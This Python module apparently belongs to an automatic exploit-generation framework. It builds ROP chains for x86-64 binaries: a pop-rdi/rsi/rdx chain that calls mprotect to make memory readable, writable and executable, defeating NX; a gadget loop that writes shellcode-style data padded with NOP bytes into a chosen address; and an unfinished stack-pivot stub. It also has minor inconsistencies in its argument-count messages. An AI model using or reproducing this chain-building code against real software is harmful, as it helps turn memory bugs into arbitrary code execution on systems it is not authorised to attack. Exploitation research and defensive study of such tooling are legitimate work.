from utils.io import *
from copy import deepcopy
from other_engine_interfaces.semantic_interface import SemanticQuerior
from gadgets.rop_gadget import ROPGadget, ROPChain

DEBUG = False

# Borrowed from usr/include/bits/mman.h
PROT_READ = 0x1  # Page can be read.
PROT_WRITE = 0x2  # Page can be written.
PROT_EXEC = 0x4  # Page can be executed.


class SURPPOT_ROP_TYPE:
    DISABLE_NX = 0
    WRTIE_SHELLCODE = 1
    STACK_PIVOT = 2


class ROPArgsVerifier:
    def __init__(self):
        pass

    @staticmethod
    def verify(arguments):
        input_name = arguments[0]['value']
        state_list = arguments[1]['value']

        args = {'input_name': input_name, 'state_list': state_list}

        try:
            rop_type = int(arguments[2]['value'])
        except:
            return {'args': None, 'info': "Arguments format error for generating ROP data!"}
        args['rop_type'] = rop_type

        if rop_type == SURPPOT_ROP_TYPE.DISABLE_NX:
            if len(arguments) < 6:
                FATAL("Arguments number should NOT be less than 5 for generating ROP data! "
                      "The arguments should be: [input, program_state, rop_type, mem_start, mem_len]")
                return {'args': None, 'info': "Arguments number should NOT be less than 4 for generating ROP data! "
                                              "The arguments should be: [input, program_state, rop_type, mem_start, mem_len]."}
            mem_start = int(arguments[3]['value'])
            mem_len = int(arguments[4]['value'])

            args['mem_start'] = mem_start
            args['mem_len'] = mem_len
            return {'args': args, 'info': 'Success!'}
        elif rop_type == SURPPOT_ROP_TYPE.WRTIE_SHELLCODE:
            if len(arguments) < 6:
                FATAL("Arguments number should NOT be less than 5 for generating ROP data! "
                      "The arguments should be: [input, program_state, rop_type, target_addr, data_to_write]")
                return {'args': None, 'info': "Arguments number should NOT be less than 4 for generating ROP data! "
                                              "The arguments should be: [input, program_state, rop_type, target_addr, "
                                              "data_to_write]."}
            target_addr = int(arguments[3]['value'])
            data_to_write = arguments[4]['value']

            args['target_addr'] = target_addr
            args['data_to_write'] = data_to_write
            return {'args': args, 'info': 'Success!'}
        elif rop_type == SURPPOT_ROP_TYPE.STACK_PIVOT:
            if len(arguments) < 5:
                FATAL("Arguments number should NOT be less than 4 for generating ROP data! "
                      "The arguments should be: [input, program_state, rop_type, reg_name]")
                return {'args': None, 'info': "Arguments number should NOT be less than 4 for generating ROP data! "
                                              "The arguments should be: [input, program_state, rop_type, reg_name."}
            reg_name = arguments[3]['value']
            args['reg_name'] = reg_name
            return {'args': args, 'info': 'Success!'}

        return {'args': None, 'info': "Arguments format error for generating ROP data!"}


class ROPGenerator:
    def __init__(self, session_id, args):
        """
        The main entry function for generating different types of ROP data.
        :param session_id: session ID.
        :param args: args: Arguments for ROP data.
        """
        self.rop_type = args['rop_type']
        self.session_id = session_id
        self.args = args
        self.semantic_querior = SemanticQuerior(is_local=True)

    def generate(self):
        if self.rop_type not in [SURPPOT_ROP_TYPE.DISABLE_NX, SURPPOT_ROP_TYPE.WRTIE_SHELLCODE,
                                 SURPPOT_ROP_TYPE.STACK_PIVOT]:
            FATAL("Invalid ROP type: %d" % self.rop_type)
            return [None, False]

        if self.rop_type == SURPPOT_ROP_TYPE.DISABLE_NX:
            try:
                memStartStr = self.args['mem_start']
                memLenStr = self.args['mem_len']
            except KeyError as e:
                FATAL("Cannot find 'mem_start' and 'mem_len' in args!")
                return [None, False]

            memStart = int(memStartStr)
            memLen = int(memLenStr)
            rop_chain, succ = self._generate_ROP_chain_to_disable_NX_for_Arch64(memStart, memLen)
            if succ:
                return [rop_chain, True]
            return [None, False]

        if self.rop_type == SURPPOT_ROP_TYPE.WRTIE_SHELLCODE:
            try:
                target_addr = self.args['target_addr']
                data_to_write = self.args['data_to_write']
            except KeyError as e:
                FATAL("Cannot find 'target_addr' and 'data_to_write' in args!")
                return [None, False]

            WARN("data to write is %s" % data_to_write)
            rop_chain, succ = self._generate_loop_write_data(target_addr, data_to_write)
            if succ:
                return [rop_chain, True]
            return [None, False]

        if self.rop_type == SURPPOT_ROP_TYPE.STACK_PIVOT:
            try:
                reg_name = self.args['reg_name']
            except KeyError as e:
                FATAL("Cannot find 'target_addr' and 'data_to_write' in args!")
                return [None, False]

            rop_chain, succ = self._generate_ROP_to_perform_stack_pivot(reg_name)
            if succ:
                return [rop_chain, True]

        return [None, False]

    def _generate_ROP_chain_to_disable_NX_for_Arch64(self, memStart, memLen):
        """
        Generate ROP data to disable NX in Arch64 platform.
        :param memStart: Where to start disable the NX.
        :param memLen: Length of memory in bytes.
        :return: ROP chain data.
        """
        pop_rdi_gadget = self.semantic_querior.get_pop_reg_gadget(self.session_id, self.args['input_name'],
                                                                  self.args['state_list'], 'rdi')
        pop_rsi_gadget = self.semantic_querior.get_pop_reg_gadget(self.session_id, self.args['input_name'],
                                                                  self.args['state_list'], 'rsi')
        pop_rdx_gadget = self.semantic_querior.get_pop_reg_gadget(self.session_id, self.args['input_name'],
                                                                  self.args['state_list'], 'rdx')
        mprotect_plt = self.semantic_querior.get_func_plt_address(self.session_id, self.args['input_name'],
                                                                  self.args['state_list'], 'mprotect')

        if pop_rdi_gadget is None or pop_rsi_gadget is None or pop_rdx_gadget is None or mprotect_plt is None:
            return None, False

        # stack layout as following:
        # data = b''
        # data += p64(pop_rdi)
        # data += p64(memStart)
        # data += p64(pop_rsi)
        # data += p64(memLen)
        # data += p64(pop_rdx)
        # data += p64(PROT_READ | PROT_WRITE | PROT_EXEC)
        # data += p64(mprotect_plt)

        pop_rdi_gadget.add_parameter(memStart)
        pop_rsi_gadget.add_parameter(memLen)
        pop_rdx_gadget.add_parameter(PROT_READ | PROT_WRITE | PROT_EXEC)
        exec_mprotect_gadget = ROPGadget(address=mprotect_plt, last_inst_addr=mprotect_plt,
                                         inst_list=['exec mprotect;',], size=8, stack_size=8)

        chain = ROPChain()
        chain.add_gadget(pop_rdi_gadget)
        chain.add_gadget(pop_rsi_gadget)
        chain.add_gadget(pop_rdx_gadget)
        chain.add_gadget(exec_mprotect_gadget)

        return chain, True

    def _generate_ROP_to_perform_stack_pivot(self, reg_name):
        """
        Generate ROP data to pivot stack to the memory pointed by taintReg.
        :param reg_name: register in string.
        :return: ROP data.
        """
        pivot_gadget_addr = self.semantic_querior.get_stack_pivot_address(self.session_id, self.args['input_name'],
                                                                          self.args['state_list'], reg_name)
        if pivot_gadget_addr is None:
            return None, False

        # TODO:
        return None, False

    def _generate_loop_write_data(self, target_address, data_to_write):
        """
        Generate ROP data to write `data_to_write` to `target_address`.
        :param target_address: where to write
        :param data_to_write: data to write
        :return: ROP chain data
        """
        move_gadget, ptr_reg, data_reg = self.semantic_querior. \
            get_move_reg_to_memory_pointed_by_reg_gadget(self.session_id, self.args['input_name'],
                                                          self.args['state_list'])
        pop_ptr_reg_gadget = self.semantic_querior.get_pop_reg_gadget(self.session_id, self.args['input_name'],
                                                                self.args['state_list'], ptr_reg)
        pop_data_reg_gadget = self.semantic_querior.get_pop_reg_gadget(self.session_id, self.args['input_name'],
                                                                 self.args['state_list'], data_reg)

        if move_gadget is None or pop_ptr_reg_gadget is None or pop_data_reg_gadget is None:
            return None, False

        def chunks(l, n):
            for i in range(0, len(l), n):
                yield l[i:i + n]

        chain = ROPChain()
        for counter, i in enumerate(chunks(data_to_write, 8)):
            cur_pop_ptr_reg_gadget = deepcopy(pop_ptr_reg_gadget)
            cur_pop_ptr_reg_gadget.add_parameter(target_address + (counter * 8))
            cur_pop_data_reg_gadget = deepcopy(pop_data_reg_gadget)
            cur_pop_data_reg_gadget.add_parameter(i.encode().ljust(8, b'\x90'))

            chain.add_gadget(cur_pop_ptr_reg_gadget)
            chain.add_gadget(cur_pop_data_reg_gadget)
            chain.add_gadget(move_gadget)

        return chain, True
